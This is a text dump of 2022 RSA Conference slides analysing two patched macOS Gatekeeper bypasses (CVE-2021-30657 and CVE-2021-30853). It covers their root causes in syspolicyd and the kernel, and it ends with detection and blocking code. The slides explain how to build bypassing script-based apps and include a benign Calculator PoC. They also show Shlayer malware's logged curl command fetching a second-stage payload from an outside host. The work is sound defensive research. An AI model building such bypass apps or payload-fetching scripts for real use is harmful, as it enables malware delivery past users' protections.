#RSAC
SESSION ID: HT-M02
All Your Macs Belong To Us ...Again!
Patrick Wardle
Founder Objective-See Foundation


#RSAC
Disclaimer
Presentations are intended for educational purposes only and do not replace independent professional judgment. Statements of fact and opinions expressed are those of the presenters individually and, unless expressly stated to the contrary, are not the opinion or position of RSA® Conference LLC or any other cosponsors. RSA Conference does not endorse or approve, and assumes no responsibility for, the content, accuracy or completeness of the information presented. Attendees should note that sessions may be audio- or video-recorded and may be published in various media, including print, audio and video formats without further notice. The presentation template and any media capture are subject to copyright protection.
©2022 RSA Conference LLC or its affiliates. All rights reserved. The RSA Conference logo and other trademarks are proprietary. All rights reserved.
2




WHOIS

#RSAC

@patrickwardle

free open-source macOS security tools

"The Art of Mac Malware" technical book series

"Objective by the Sea" macOS security conference
3




OUTLINE

#RSAC

Background

A flaw In the wild?

Another flaw

Protection

Topics covered: os internals, reversing, malware analysis, & security tool development.
4

Background
how apple seeks to protect mac users

MAC INFECTION VECTORS

#RSAC

...the vast majority, require user "assistance"

fake updates

infected :/
poisoned search results & infected sites

pirated (trojaned) applications

6



THE GROWTH OF MAC MALWARE

#RSAC

...and Apple's multi-layer defense

aim to protect the user from infecting themselves

more than

Windows !?

File quarantine

Gatekeeper

more Mac Malware (credit: MalwareBytes)

Notarization
anti-infection mechanisms (applied to downloaded items)

 


7

QUARANTINE ATTRIBUTE

#RSAC

added to all downloaded items

Triggers checks: · gatekeeper · notarizations · file quarantine

q attr: com.apple.quarantine
% xattr ~/Downloads/malware.app com.apple.quarantine
% xattr -p com.apple.quarantine ~/Downloads/malware.app 0081;606ec805;Chrome;BCCEDD88-5E0C-4F6A-95B7-DBC0D2D645EC
xattr shows (quarantine) attributes

A quarantine attribute is added to downloaded items. When launched, it signifies the item should be subjected to various anti-infection checks.


 
 
 
 


8

FILE QUARANTINE (2007)

#RSAC

user confirmation when launching an application

a presentation ...or is it malware? (it's OSX.WindTail)

Shortcoming:

Open

file quarantine prompt (note: "is an app")

When a user opens a downloaded item, file quarantine displays a prompt that requires explicit user confirmation before allowing the file to execute.


 

9

GATEKEEPER (2012)

#RSAC

block unsigned applications

Shortcoming: signed malware

not mozilla!

Built atop File Quarantine, Gatekeeper checks the code signing information of downloaded items and blocks those that do not adhere to system policies.
10

NOTARIZATION (2019)

#RSAC

block non-verified applications

malware?

clean

not notarized? blocked!



"Ruined our whole op[eration]"
11

A (core OS) Flaw
...and root cause analysis

A BUG!?!

#RSAC

discovered by Cedric Owens (@cedowens)

"Wanted to get your thoughts...

(at the time) fully patched Big Sur

I am masquerading shell script malware as an.app

I put it online. Then I download & dbl click the fake .app - the shell script launches.

No prompts at all from the OS"

  
   

13

TRIAGE OF THE POC

#RSAC

(correctly) quarantined, but unsigned & allowed!?

Item type: application
unsigned (thus not notarized)

$ xattr ~/Downloads/PoC.app

...

q attr is set!

com.apple.quarantine

$ xattr -p com.apple.quarantine ~/Downloads/PoC.app 0081;606fefb9;Chrome;688DEB5F-E0DF-4681-B747-1EC74C61E8B6

An unsigned app, can bypass file quarantine, gatekeeper, and notarization requirements !?!?


 
 
 


14

SO WHAT'S GOING ON

#RSAC

taking a closer look at PoC.app

% find PoC.app PoC.app/Contents PoC.app/Contents/MacOS PoC.app/Contents/MacOS/PoC
% file PoC.app/Contents/MacOS/PoC PoC.app/Contents/MacOS/PoC: POSIX shell script text executable, ASCII text

An application:

always present in 'normal' apps

no Info.plist file (metadata file, describing the app)

executable, is a script

The "Appify" developer script on GitHub, will create such a

bare-bones script-based application.

...that unintentionally, would trigger this vulnerability!

 

 
   
 

15

BEHIND THE SCENES

#RSAC

what goes on when you launch an app?

}

Behind the scenes ("Gatekeeper Exposed; Come, See, Conquer")
When a user launches an app, no less than half a dozen usermode applications, system daemons and the kernel are involved!
16


TO THE LOGS

#RSAC

comparing the output of various apps vs. our PoC

Let's launch various downloaded unsigned apps and our PoC ...and see what shows up in the system logs.

Standard app (w/ Info.plist)

Script-based app (w/ Info.plist)

Bare-boned scriptbased app (no Info.plist)



17


STANDARD APP

#RSAC

mach-o binary + Info.plist file

% log stream --level debug ...

syspolicyd: responsible for allowing/deny applications

syspolicyd: [com.apple.syspolicy.exec:default] GK process assessment: /Volumes/MachOView 1/MachOView.app/Contents/

MacOS/MachOView <-- (/sbin/launchd, /Volumes/MachOView 1/MachOView.app/Contents/MacOS/MachOView)

syspolicyd: [com.apple.syspolicy.exec:default] GK performScan: PST: (path: /Volumes/MachOView 1/MachOView.app), (team: (null)), (id: (null)), (bundle_id: (null))

syspolicyd: [com.apple.syspolicy.exec:default] Checking legacy notarization syspolicyd: (Security) [com.apple.securityd:notarization] checking with online notarization service for hash ... syspolicyd: (Security) [com.apple.securityd:notarization] isNotarized = 0

syspolicyd: [com.apple.syspolicy.exec:default] GK scan complete: PST: (path: /Volumes/MachOView 1/MachOView.app), (team: (null)), (id: (null)), (bundle_id: (null)), 7, 0

syspolicyd: [com.apple.syspolicy.exec:default] App gets first launch prompt because responsibility: /Volumes/MachOView

1/MachOView.app/Contents/MacOS/MachOView, /Volumes/MachOView 1/MachOView.app

scan results

syspolicyd: [com.apple.syspolicy.exec:default] GK evaluateScanResult: 0, PST: (path: /Volumes/MachOView 1/ MachOView.app), (team: (null)), (id: (null)), (bundle_id: MachOView), 1, 0, 1, 0, 7, 0

syspolicyd: [com.apple.syspolicy.exec:default] GK eval - was allowed: 0, show prompt: 1

syspolicyd: [com.apple.syspolicy.exec:default] Prompt shown (7, 0), waiting for response: PST: (path: /Volumes/ MachOView 1/MachOView.app), (team: (null)), (id: (null)), (bundle_id: MachOView)

log output

18

 
 
 
 
 
 
 
 

 
 


STANDARD SCRIPT-BASED APP

#RSAC

(bash) script + Info.plist file

% log stream --level debug

script-based evaluation

...

syspolicyd [com.apple.syspolicy.exec:default] Script evaluation: /Users/patrick/Downloads/Script.app/Contents/MacOS/ Script, /bin/sh

syspolicyd [com.apple.syspolicy.exec:default] GK process assessment: /Users/patrick/Downloads/Script.app/Contents/ MacOS/Script <-- (/bin/sh, /bin/sh)

syspolicyd [com.apple.syspolicy.exec:default] GK performScan: PST: (path: /Users/patrick/Downloads/Script.app), (team: (null)), (id: (null)), (bundle_id: (null))

syspolicyd: [com.apple.syspolicy.exec:default] Checking legacy notarization syspolicyd: (Security) [com.apple.securityd:notarization] checking with online notarization service for hash ... syspolicyd: (Security) [com.apple.securityd:notarization] isNotarized = 0

syspolicyd: [com.apple.syspolicy.exec:default] GK scan complete: PST: (path: /Users/patrick/Downloads/Script.app), (team: (null)), (id: (null)), (bundle_id: (null)), 7, 0

syspolicyd: [com.apple.syspolicy.exec:default] App gets first launch prompt because responsibility: /bin/sh, /Users/

patrick/Downloads/Script.app

scan results

syspolicyd: [com.apple.syspolicy.exec:default] GK evaluateScanResult: 0, PST: (path: /Users/patrick/Downloads/ Script.app), (team: (null)), (id: (null)), (bundle_id: Script), 1, 0, 1, 0, 7, 0

syspolicyd: [com.apple.syspolicy.exec:default] GK eval - was allowed: 0, show prompt: 1

syspolicyd: [com.apple.syspolicy.exec:default] Prompt shown (7, 0), waiting for response: PST: (path: /Users/patrick/ Downloads/Script.app), (team: (null)), (id: (null)), (bundle_id: Script)


 
 
 
 
 
 
 

 
 
 


19



BARE-BONED SCRIPT-BASED APP

#RSAC

(bash) script + no Info.plist file

% log stream --level debug

script-based evaluation

...

syspolicyd: [com.apple.syspolicy.exec:default] Script evaluation: /Users/patrick/Downloads/PoC.app/Contents/MacOS/ PoC, /bin/sh

syspolicyd: [com.apple.syspolicy.exec:default] GK process assessment: /Users/patrick/Downloads/PoC.app/Contents/MacOS/ PoC <-- (/bin/sh, /bin/sh)

syspolicyd: [com.apple.syspolicy.exec:default] GK performScan: PST: (path: /Users/patrick/Downloads/PoC.app/Contents/ MacOS/PoC), (team: (null)), (id: (null)), (bundle_id: (null))

syspolicyd: [com.apple.syspolicy.exec:default] Checking legacy notarization syspolicyd: (Security) [com.apple.securityd:notarization] checking with online notarization service for hash ... syspolicyd: (Security) [com.apple.securityd:notarization] isNotarized = 0

syspolicyd: [com.apple.syspolicy.exec:default] GK scan complete: PST: (path: /Users/patrick/Downloads/PoC.app/Contents/

MacOS/PoC), (team: (null)), (id: (null)), (bundle_id: (null)), 7, 0

scan results

syspolicyd: [com.apple.syspolicy.exec:default] GK evaluateScanResult: 2, PST: (path: /Users/patrick/Downloads/PoC.app/ Contents/MacOS/PoC), (team: (null)), (id: (null)), (bundle_id: NOT_A_BUNDLE), 1, 0, 1, 0, 7, 0

syspolicyd: [com.apple.syspolicy.exec:default] Updating flags: /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC, 512


 
 
 



 
 



20

 



TO THE LOGS
the (log) results
mach-O || script-based app with an Info.plist file:
GK evaluateScanResult: 0, PST: (path: /Users/ patrick/Downloads/Script.app), (team: (null)), (id: (null)), (bundle_id: Script), 1, 0, 1, 0, 7, 0

#RSAC

bare-boned script-based app with no Info.plist file:

GK evaluateScanResult: 2, PST: (path: /

vs.

Users/patrick/Downloads/PoC.app/Contents/ MacOS/PoC), (team: (null)), (id: (null)),

(bundle_id: NOT_A_BUNDLE), 1, 0, 1, 0, 7, 0

syspolicyd GK evaluateScanResult: 0 GK evaluateScanResult: 2

21


EVALUATION TYPE 0X2?

#RSAC

if set, item is allowed!

01 /* @class EvaluationManager */

02 -(void *)evaluateScanResult:arg2 withEvaluationArguments: arg3

03

withPolicy:arg4 withEvaluationType:arg5 withCodeEval:arg6 {

04 ...

05 06 if (arg5 == 0x2) { 07

for the PoC.app ...eval type is 0x2, so no prompt is shown!

08

//no prompt shown

09

// update flags and leave

10

[evalResult setAllowed:YES];

11

return;

12 13

}

14 15 16

[r14 presentPromptOfType:...]; os_log_impl(..., "Prompt shown", ...);

(lldb) po [$rdi className] EvaluationResult
(lldb) po [$rdi evaluationTargetPath]

~/Downloads/PoC.app/Contents/MacOS/PoC

evaluateScanResult: ... logic

(lldb) p (BOOL)[$rdi allowed] (BOOL) $83 = YES

(lldb) p (BOOL)[$rdi wouldPrompt] (BOOL) $82 = NO

      
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
   
   
        
 
 
 

allowed, with no prompt! 22


EVALUATION TYPE 0X2

#RSAC

where does it come from (returned)

01 /* @class EvaluationPolicy */

02 -(unsigned long long)determineGatekeeperEvaluationTypeForTarget:arg2

03

withResponsibleTarget:arg3 {

04 ...

05

06 if(YES != [policyScanTarget isUserApproved]) { 07

we're not (yet) approved

08

if(YES == [policyScanTarget isScript]) {

09

10

r15 = 0x2;

yes, PoC.app is script-based

11

if(YES != [policyScanTarget isBundled]) goto leave;

12 }

leave (with 0x2 (allow)),

13 14 leave:

if app is "not a bundle" !?

15 rax = r15;

16 return rax;

(lldb) po $rdi

determineGatekeeperEvaluation: ...

PST: (path: ~/Downloads/PoC.app/ Contents/MacOS/PoC), (team: (null)),

logic

(id: (null)), (bundle_id: NOT_A_BUNDLE)

(lldb) p (BOOL)[$rdi isBundled] (BOOL) $1 = NO

     
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
     
   
 
     

...not a bundle?


23

EVALUATION TYPE 0X2

#RSAC

returned if 'isBundle' flag not set

01 /* @class PolicyScanTarget */

02 -(char)isBundled {

03

return sign_extend_64(self->_isBundled);

04 }

just returns 'isBundled' iVar

isBundled: method

where is 'isBundled' set?

01 /* @class ExecManagerPolicy */

02 -(void)evaluateCodeForUser:arg2 withPID:arg3 withProcessPath:arg4

03 withParentProcessPath:arg5 withResponsibleProcess:arg6 withLibraryPath:arg7

04 processIsScript: withCompletionCallback:arg9 {

05 ... 06

return value

passed to `setIsBundled:"` 07 rax = sub_10001606c(rbx, 0x0);
08 [policyScanTarget setIsBundled:rax];

evaluateCodeForUser: ...

sets 'isBundle' flag, based on subroutine result

 
 
 
 
 
 
 
 
 
 
 
 
       
  

24

EVALUATION TYPE 0X2
why is our poc, not classified as bundle!?

01 int sub_10001606c(arg0, arg1) { 02

tldr; to be classified as a bundle,

03 BOOL isBundle = NO; 04 ...

an item must have an Info.plist !

05

06 if ( ((sub_100015829(rbx, @"Contents/Info.plist") != 0x0) ||

07

(sub_100015829(rbx, @"Versions/Current/Resources/Info.plist") != 0x0)) ||

08

(sub_100015829(rbx, @"Info.plist") != 0x0))

09 {

10

isBundle = YES;

11 }

12

13 return isBundle;

#RSAC

     
 
 
 
 
 
 
 
 
 
 
 
 
   
  

our PoC (no Info.plist)
 
 
 
  

(lldb) po $rdi PST: (path: ~/Downloads/PoC.app/ Contents/MacOS/PoC), (team: (null)), (id: (null)), (bundle_id: NOT_A_BUNDLE)
(lldb) p (BOOL)[$rdi isBundled] (BOOL) $1 = NO
...not a bundle 25


SUMMARY OF THE BUG

#RSAC

...a script-based "not a bundle" is allowed

An application:

no Info.plist file executable, is a script

% find PoC.app PoC.app/Contents PoC.app/Contents/MacOS PoC.app/Contents/MacOS/PoC

% file PoC.app/Contents/MacOS/PoC PoC.app/Contents/MacOS/PoC: POSIX shell script

Gatekeeper? Notarization? File Quarantine?

more details on reversing!

"All Your Macs Are Belong To Us" objective-see.com/blog/blog_0x64.html

 
 
  
   
 

26

PATCH (FOR CVE-2021-30657)

#RSAC

"is a bundle" algorithm improved

is a bundle ...now, will scan!

Patched: CVE-2021-30657 (macOS 11.3)

Patch summary:

is ".app"?
or

}

contains "Contents/MacOS"

PoC (and malware)
now blocked! 27


In the Wild!?
...exploited as an 0day

INFECTION VECTOR

#RSAC

poisoned search results/infected sites

"Shlayer malware abusing Gatekeeper bypass on macOS" -jamf.com
29

THE SEARCH
...and a match!?

#RSAC
the search criteria

no Info.plist file executable, is a script

% find /Volumes/Installer

...

/Volumes/Installer/Install /Volumes/Installer/yWnBJLaF

no Info.plist

/Volumes/Installer/yWnBJLaF/1302.app

/Volumes/Installer/yWnBJLaF/1302.app/Contents

/Volumes/Installer/yWnBJLaF/1302.app/Contents/MacOS

/Volumes/Installer/yWnBJLaF/1302.app/Contents/MacOS/1302

% ls -lart /Volumes/Installer/Install

/Volumes/Installer/Install -> yWnBJLaF/1302.app

% file 1302.app/Contents/MacOS/1302

script-based

Bourne-Again shell script executable (binary data)

% spctl --assess --type execute 1302.app

unsigned

1302.app: rejected / source=no usable signature

a candidate application?

"1302.app"

30


 
 
 
 
 
 
 
 
 
 
 
 


ALLOWED TO RUN

#RSAC

...due to the same flaw!

# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty

...

{

"event" : "ES_EVENT_TYPE_NOTIFY_EXEC",

"process" : { "path" : "/bin/bash",
"arguments" : [

allowed to run!

"/bin/bash",

"/private/.../AppTranslocation/.../1302.app/Contents/MacOS/1302"

]

}

}

{

"event" : "ES_EVENT_TYPE_NOTIFY_EXEC",

"process" : { "path" : "/usr/bin/curl",

"arguments" : [ "curl", "-L",

downloads 2nd stage payload ( via curl )

"https://bbuseruploads.s3.amazonaws.com/

c237a8d2-0423-4819-8ddf-492e6852c6f7/downloads/.../d9o"

]

}

}


 
 
 
 
 
 
 
 
 
   
 
 
 
  
 
 
 
 
 
 


31

Another Flaw
...the story continues?

BUT WAIT

#RSAC

...there is more!?

Patched: CVE-2021-30853 (macOS 12 (beta 6) + 11.6)

Gordon Long @ethicalhax / Box
An unsigned app, can *still* bypass file quarantine, gatekeeper, and notarization
requirements !?

Same impact (as CVE-'21-30657), but is a totally different bug!



33

NEW POC

#RSAC

an "interpreter-less" script-based application

normal scripts specify an interpreter ( e.g. #!/bin/bash ). This script does not!

% cat PoC.app/Contents/MacOS/PoC #! /bin/bash

open /System/Applications/Calculator.app &
interpreter-less script ...that's it!
fully bypasses: Gatekeeper? Notarization? File Quarantine?

   
 


unsigned & non-notarized (and quarantined)
generates no sypolicyd log messages :(
let's track down the bug, starting from app launch!
34

POC APPLICATION LAUNCH

#RSAC

xpcproxy, invokes posix_spawnp




% lldb

(lldb) process attach --name xpcproxy --waitfor Process 46291 stopped

(lldb) b posix_spawnp Breakpoint 1: where = libsystem_c.dylib`posix_spawnp

Process 46291 stopped stop reason = breakpoint 1.1
libsystem_c.dylib`posix_spawnp: -> 0x7fff20374f00 <+0>: pushq %rbp

breakpoint hit: posix_spawnp file: PoC's script

(lldb) x/s $rsi
0x7faea7406009: "/private/var/.../AppTranslocation/ BE96EA39-506B-4980-A8BA-62CF5892521B/d/PoC.app/Contents/MacOS/PoC"

xpcproxy launching PoC
(via posix_spawnp) 35

 
 
  
 
 
    


POSIX_SPAWNP
...on error, an interesting observation!
sys/posix_spawn.c

01 #define _PATH_BSHELL "/bin/sh"

02

03 int posix_spawnp(pid_t * __restrict pid, const char * __restrict file, ...)

04 {

05

int err = 0;

06

...

07

err = posix_spawn(pid, bp, file_actions, attrp, argv, envp);

08

switch(err){

09

...

10

11

case ENOEXEC:

12

...

13

memp[0] = "sh";

14

memp[1] = bp;

15

bcopy(argv + 1, memp + 2, cnt * sizeof(char *));

16

err = posix_spawn(pid, _PATH_BSHELL, file_actions, attrp, memp, envp);

posix_spawnp (and error handling)

#RSAC

attempts to launch file via posix_spawn

on failure (ENOEXEC), (re)execute via /bin/sh

   
 
 
 
 
 
 
 
 
 
 
 
 
   
              

36

POC APPLICATION LAUNCH

#RSAC

triggers error and (re)execution via /bin/sh

(lldb) finish
Process 47099 stopped * stop reason = step out (posix_spawn)

libsystem_c.dylib`posix_spawnp: -> 0x7fff203750b1: movl %eax, %r12d
(lldb) reg read $rax rax = 0x0000000000000008

error code 0x8 ( ENOEXEC )

triggers error (ENOEXEC)

(re)executed via /bin/sh
 
 
 
 
  
 
   
 


# ProcessMonitor -pretty

{

"event" : "ES_EVENT_TYPE_NOTIFY_EXEC",

"process" : { "path" : "/bin/sh", "arguments" : [ "sh",

path, now: /bin/sh

arg: PoC's script

"/private/var/.../AppTranslocation/ BE96EA39-506B-4980-A8BA-62CF5892521B/d/PoC.app/Contents/MacOS/PoC"

]


 
 
 


37

Q: WHY THE ERROR?

#RSAC

A: because we didn't specify an interpreter

kern/kern_exec.c

01 /* Image activator for interpreter scripts.

02 If the image begins with the characters "#!",

03 then it is an interpreter script.

04 ...

05

06 -3

Success: interpreter: relookup

07 */

08 static int exec_shell_imgact(struct image_params *imgp){

09

10 /* Make sure it's a shell script... */

11 if (vdata[0] != '#' ||

12

vdata[1] != '!') {

13

return -1;

14 }

15

16 /* Try to find the first non-whitespace character */

17 for (ihp = &vdata[2]; ihp < &vdata[IMG_SHSIZE]; ihp++) {

18

if (IS_EOL(*ihp)) {

19

/* Did not find interpreter, "#!\n" */

20

return ENOEXEC;

21

...

22

}

23 }

% cat PoC.app/Contents/MacOS/PoC
#!
no interpreter? ...triggers ENOEXEC

     
 
 
 
 
 
 
 
 
 
 
 
 
          
    

exec_shell_imgact
        
      

38

Q: WHAT IS SKIPPED ON ERROR?
A: the setting of various variables

kern/kern_exec.c

01 static int exec_activate_image(struct image_params *imgp){

02

...

03

for (i = 0; error == -1 && execsw[i].ex_imgact != NULL; i++) {

04 05

error = (*execsw[i].ex_imgact)(imgp);

-3 means:

06

case -3:

/* Interpreter */

07

'script' (interpreter) ok'

08

/*

09

* Copy the script label for later use. Note that

10

* the label can be different when the script is

11

* actually read by the interpreter.

12

*/

13

...

14

imgp->ip_scriptlabelp = mac_vnode_label_alloc();

15 16 17 18

} mac_vnode_label_copy(imgp->ip_vp->v_label, imgp->ip_scriptlabelp);
if (vnode_getwithref(imgp->ip_vp) == 0) { imgp->ip_scriptvp = imgp->ip_vp;

19

}

imgp->ip_scriptvp & imgp->ip_scriptlabelp get set

  
 
 
 
 
 
 
 
 
 
         
        
              

#RSAC
"Copy the script label for later use."
( ...more on this soon! )
executed for valid scripts
39

APPLESYSTEMPOLICY.KEXT

#RSAC

the "initiator" of policy enforcement

MAC hook, automatically invoked for all new process events

mac_proc_notify_exec_complete

ASP Kext

::evaluateScript

kernel mode

MAC subsystem

syspolicyd (+log msgs!)



40

APPLESYSTEMPOLICY.KEXT

automatically invoked for all new proce#sRsSeAsC

mac hook callback: procNotifyExecComplete

01 AppleSystemPolicy::procNotifyExecComplete(proc*)

02

...

03

path = *(*(ASPProcessInfo::cred() + 0x78) +

04

*(int32_t *)(rbx + 0xb64) * 0x8 + 0x8);

05

06

if (path != 0x0) {

07

rax = vnode_for_path(path);

08

vnode = rax;

09

if (vnode == 0x0)

10

IOLog("ASP: Unable to retrieve vnode for script: %s\n", path);

11

}

12

13

14

...

if vnode (from path) is NULL, ...no script check is performed !

15

r13 = vnode

16

if ( (r15 != 0x0) && (r13 != 0x0) ... )

17

ASPScriptInfo::ASPScriptInfo(&ASP_Script_OBJ, r13);

18

rax = AppleSystemPolicy::evaluateScript(procArg, &ASP_OBJ);

19

...

20

21

}

path? vnode (from path, of script)
check

procNotifyExecComplete logic (invokes AppleSystemPolicy::evaluateScript)
  
 
 
 
 
 
 
 
 
 
           
     
           
  
 

syspolicyd
41

BUT FOR AN INTERPRETER-LESS SCRIPT

#RSAC

...ip_script* are NULL, so is label->l_perpolicy[3]

01 AppleSystemPolicy::procNotifyExecComplete(proc*)

02

...

03

path = *(*(ASPProcessInfo::cred() + 0x78) +

04

*(int32_t *)(rbx + 0xb64) * 0x8 + 0x8);

script path = label->l_perpolicy[3];

(lldb) expr *(struct image_params*)0xffffff934e3c3000

(struct image_params) $1 = {

...

ip_strings = 0xffffffa04a011000

"executable_path=/bin/sh"

NULL

...

ip_scriptlabelp = 0x0000000000000000

ip_scriptvp = 0x0000000000000000

}

(lldb) Process 1 stopped AppleSystemPolicy::procNotifyExecComplete: -> 0xffffff800abd5c8b: movl 0x78(%rax), %eax

(lldb) ni

lldb) expr * (struct label*)$rax

(struct label) $1 = {

l_flags = 1

l_perpolicy = {

[0] = 0xffffff867ca29c40 ...

thus NULL

[3] = 0x0000000000000000

ip_script* are both NULL label->l_perpolicy[3] is NULL

...so, evaluateScript is never invoked!

42

 
 
 
 
 
 
  
 
 
  
 
  
  
 
 
 
 
 
 
 
 
   


SUMMARY OF THE BUG

#RSAC

an "interpreter-less" script-based app

PoC's script fails with ENOEXEC, so is then (re)executed via /bin/sh
...but script's label never gets set

As script label is NULL, the script is never evaluated (nor blocked) by syspolicyd

The policy engine just sees /bin/sh (a trusted platform binary), and thus allows it to execute

...and /bin/sh then executes PoC script





Gatekeeper? Notarization? File Quarantine?43

Protections
against these script-based attacks ( and more! )

THE SIMPLE IDEA

#RSAC

...block downloaded, non-notarized items

Can we just detect (and block) the execution any download code, that is not notarized?

Detect new process launches

Is item from the internet? (and launched by the user)
Is item non-notarized?

block! 45

DETECTING NEW PROCESS LAUNCHES
...via Apple's Endpoint Security Framework (ESF)

01 //client/event of interest

02 @property es_client_t* esClient;

03 es_event_type_t events[] = {ES_EVENT_TYPE_AUTH_EXEC}; 04 05 //new client 06 //callback will process 'ES_EVENT_TYPE_AUTH_EXEC' events

callback for process execs

07 es_new_client(&esClient, ^(es_client_t *client, const es_message_t *message)

08 {

09

//TODO: process event

10

// return ES_AUTH_RESULT_ALLOW or ES_AUTH_RESULT_DENY

11 }

12

13 //subscribe

14 es_subscribe(endpointProcessClient, events, 1);

ESF Process Exec Monitor (ES_EVENT_TYPE_AUTH_EXEC)

}

#RSAC

"Writing a Process Monitor with Apple's Endpoint Security Framework" objective-see.com/blog/blog_0x47.html

    
 
 
 
 
 
 
 
 
 
 
 
 
 
           

46

IS ITEM USER-LAUNCHED & FROM THE INTERNET?

#RSAC

...via app translocation status

prevent hijack attacks

(DefCon 2015)

(just) app

App Translocation

translocated (read-only mount)

01 void *handle = NULL;| 02 bool isTranslocated = false; 03 04 //get 'SecTranslocateIsTranslocatedURL' (private) API 05 handle = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_LAZY); 06 secTranslocateIsTranslocatedURL = dlsym(handle, "SecTranslocateIsTranslocatedURL"); 07 08 //check (will set isTranslocated variable) 09 secTranslocateIsTranslocatedURL([NSURL fileURLWithPath:path], &isTranslocated, NULL);

is item translocated?

(via (private) SecTranslocateIsTranslocatedURL)

  
 
 
 
 
 
 
 
 
         

47

OR, IS IT QUARANTINED?

#RSAC

...checking the quarantine flags

01 //open quarantine dylib / resolve function pointers

02 handle = dlopen("/usr/lib/system/libquarantine.dylib", RTLD_LAZY);

03

04 qtn_file_free_FP = dlsym(handle, "_qtn_file_free");

05 qtn_file_alloc_FP = dlsym(handle, "_qtn_file_alloc");

06 qtn_file_get_flags_FP = dlsym(handle, "_qtn_file_get_flags");

07 qtn_file_init_with_path_FP = dlsym(handle, "_qtn_file_init_with_path");

08

09 quarantineFile = qtn_file_alloc_FP();

10

11 //init & grab quarantine flags

12 error = qtn_file_init_with_path_FP(quarantineFile,

13

[NSURL fileURLWithPath:path].path.fileSystemRepresentation);

14 if(QTN_NOT_QUARANTINED == error)

15

flags = QTN_NOT_QUARANTINED;

16 else

17

flags = qtn_file_get_flags_FP(quarantineFile);

18

19 qtn_file_free_FP(quarantineFile);

    
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
  

is item quarantined? (via (private) libquarantine APIs)

            

48


IS ITEM NOTARIZED?
...via SecStaticCodeCheckValidity
01 SecStaticCodeRef staticCode = NULL; 02 SecRequirementRef isNotarized = nil; 03 04 //init code ref / requirement string 05 SecStaticCodeCreateWithPath(path, kSecCSDefaultFlags, &staticCode); 06 SecRequirementCreateWithString(CFSTR("notarized"), kSecCSDefaultFlags, &isNotarized); 07 08 //check against requirement string (will set isNotarized variable) 09 SecStaticCodeCheckValidity(staticCode, kSecCSDefaultFlags, isNotarized);
is item notarized? (via SecStaticCodeCheckValidity)
or
  
 
 
 
 
 
 
 
 
       

#RSAC
49

IN ACTION

#RSAC

...generic protection, before Apple's patches!

full code: BlockBlock
github.com/objective-see/BlockBlock

BlockBlock ...block block'ing
50


DETECTION VIA EXECPOLICY DATABASE
...updated by syspolicyd (with decision)

% log stream syspolicyd: [com.apple.syspolicy.exec:default]
Updating flags: ~/PoC.app/Contents/MacOS/PoC, 512"

CVE-2021-30657

# fs_usage -w -f filesystem | grep syspolicyd ... RdData[S] D=0x052fdb4a B=0x1000 /dev/disk1s1 /private/var/db/SystemPolicyConfiguration/ExecPolicy-wal

syspolicyd.55183

no item path(s)?

/private/var/db/SystemPolicyConfiguration/ExecPolicy
    

FROM OBJECT_ID TO FILE PATH
...as it's a file inode
% stat ~/Downloads/PoC.app/Contents/MacOS/PoC 16777220 2354288 ... /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC # sqlite3 ExecPolicy sqlite> .headers on sqlite> SELECT * FROM policy_scan_cache WHERE object_id = 2354288; pk|volume_uuid|object_id|fs_type_name|bundle_id|cdhash|team_identifier| signing_identifier|policy_match|malware_result|flags|mod_time|timestamp| revocation_check_time|scan_version 15949|0612A910-2C3C-4B72-9C90-1ED71F3070C3| 2354288 |apfs|NOT_A_BUNDLE|||| 7|0|512|1618194723|1618194723|1618194723|4146150715079370460
inode (2354288) -> path (~/Downloads/PoC.app/...)


 
 
 
 


SCAN.PY
programmatic detection of exploitations

01 #get file path from vol & file inode 02 url = Foundation.NSURL.fileURLWithPath_('/.vol/' + str(v_inode) + '/' + str(f_inode)) 03 result, file, error = url.getResourceValue_forKey_error_(None, "NSURLCanonicalPathKey", None)
file path, from file inode

# python scan.py volume inode: 16777220 volume uuid: 0A81F3B1-51D9-3335-B3E3-169C3640360D
opened 'ExecPolicy' database extracted 183 evaluated items
* malicious application * ~/Downloads/yWnBJLaF/1302.app
programmatic detection

(also) checks that:
an application with: no Info.plist file
executable, is script

full code: scan.py objective-see.com/downloads/blog/blog_0x64/scan.py
 
 
 
     
 
  
 

Conclusions

CONCLUSIONS
macOS (still) has shallow bugs

#RSAC
Root cause analysis of CVE-2021-30657 /2021-30853
0day exploitation

}

Generic protections
go forth: macOS spelunking, reversing, malware analysis, & security tool development!
55


...BUT WAIT? THERE'S MORE!

#RSAC

top-level item, no quarantine attribute!

"Jamf Threat Labs identifies Safari vulnerability allowing for Gatekeeper bypass"
www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/


APPLY

#RSAC

before anything else!
Patch ...& enable automatic updates

Install an EDR product (macOS-centric & heuristic-based)

Continue to learn about macOS threats
 

INTERESTED IN LEARNING MORE?
...about malware analysis, macOS security topics?
"The Art of Mac Malware" free, at: taomm.org
Order: nostarch.com/art-mac-malware


MAHALO!

#RSAC

supporters of the Objective-See Foundation

SmugMug

Guardian Mobile Firewall

iVerify

Halo Privacy

uberAgent
59

#RSAC
All Your Macs Belong To Us ...Again!

RESOURCES:
"All Your Macs Are Belong To Us" objective-see.com/blog/blog_0x64.html
"macOS Gatekeeper Bypass (2021) Addition" cedowens.medium.com/macos-gatekeeper-bypass-2021-edition-5256a2955508
"Shlayer Malware Abusing Gatekeeper Bypass On macOS" www.jamf.com/blog/shlayer-malware-abusing-gatekeeper-bypass-on-macos/
"syspolicyd Internals" https://knight.sc/reverse%20engineering/2019/02/20/syspolicyd-internals.html

  

       

60

